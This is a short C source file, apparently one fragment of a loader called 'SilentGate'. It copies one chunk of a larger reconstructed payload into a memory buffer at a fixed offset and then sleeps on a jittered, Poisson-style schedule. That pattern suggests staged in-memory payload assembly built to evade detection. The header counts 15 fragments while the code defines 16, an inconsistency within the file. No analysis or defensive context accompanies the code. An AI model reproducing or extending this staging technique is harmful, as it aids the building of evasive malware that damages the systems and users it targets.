/*
 * SilentGate Fragment 6/15
 * Offset: 45654 bytes  Size: 7609 bytes
 * Schedule: t=517ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   6
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  121746
#define CHUNK_OFFSET  45654
#define CHUNK_SIZE    7609
#define SLEEP_NEXT_MS 517

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 6: Write chunk 6 */
void sg_execute_fragment_6(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 6] Writing chunk at t=517ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 6] Chunk 6 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
